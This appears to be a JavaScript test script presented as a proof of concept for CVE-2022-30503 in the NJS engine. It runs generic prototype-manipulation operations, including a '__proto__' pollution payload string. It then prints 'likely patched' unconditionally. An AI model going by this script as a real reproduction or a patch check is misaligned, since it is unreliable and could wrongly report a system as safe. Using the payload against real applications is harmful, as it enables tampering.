// CVE-2022-30503 Proof of Concept
// Target: NJS versions with prototype chain vulnerabilities
// Type: Prototype pollution and memory corruption

function main() {
    console.log("Starting CVE-2022-30503 reproduction...");
    
    try {
        // Create objects for prototype manipulation
        const baseObj = {};
        const childObj = Object.create(baseObj);
        
        // Prototype pollution attempts
        console.log("Testing prototype pollution...");
        
        // Attempt to pollute Object.prototype
        const maliciousPayload = '{"__proto__": {"polluted": "yes"}}';
        try {
            const parsed = JSON.parse(maliciousPayload);
            console.log("JSON prototype pollution test:", parsed);
        } catch (e) {
            console.log("JSON prototype pollution blocked:", e.message);
        }
        
        // Direct prototype manipulation
        const targetObj = {};
        targetObj.__proto__ = {
            maliciousProp: "injected",
            toString: function() { return "hacked"; }
        };
        
        // Test prototype chain manipulation
        const protoChain = {};
        protoChain.constructor = {
            prototype: {
                maliciousMethod: function() { return "compromised"; }
            }
        };
        
        // Object property operations that may trigger vulnerability
        console.log("Testing Object.setPrototypeOf()...");
        const newProto = { dangerous: true };
        Object.setPrototypeOf(baseObj, newProto);
        
        console.log("Testing Object.getPrototypeOf()...");
        const retrievedProto = Object.getPrototypeOf(baseObj);
        
        // Property descriptor manipulation
        console.log("Testing property descriptor manipulation...");
        const descriptorObj = {};
        Object.defineProperty(descriptorObj, "hidden", {
            value: "secret",
            writable: false,
            enumerable: false,
            configurable: true
        });
        
        // Attempt to modify non-configurable properties
        try {
            Object.defineProperty(descriptorObj, "hidden", {
                value: "modified",
                writable: true
            });
        } catch (e) {
            console.log("Property modification blocked:", e.message);
        }
        
        // Test with constructor manipulation
        console.log("Testing constructor manipulation...");
        function CustomConstructor() {
            this.value = "original";
        }
        
        const instance = new CustomConstructor();
        instance.constructor = function() { return "hijacked"; };
        
        // Prototype chain traversal
        let current = childObj;
        let depth = 0;
        while (current && depth < 100) {
            current = Object.getPrototypeOf(current);
            depth++;
        }
        
        console.log("CVE-2022-30503: Prototype operations completed");
        console.log("Prototype chain depth:", depth);
        console.log("No crash detected - likely patched");
        
    } catch (error) {
        console.log("Error:", error.message);
    }
}

main();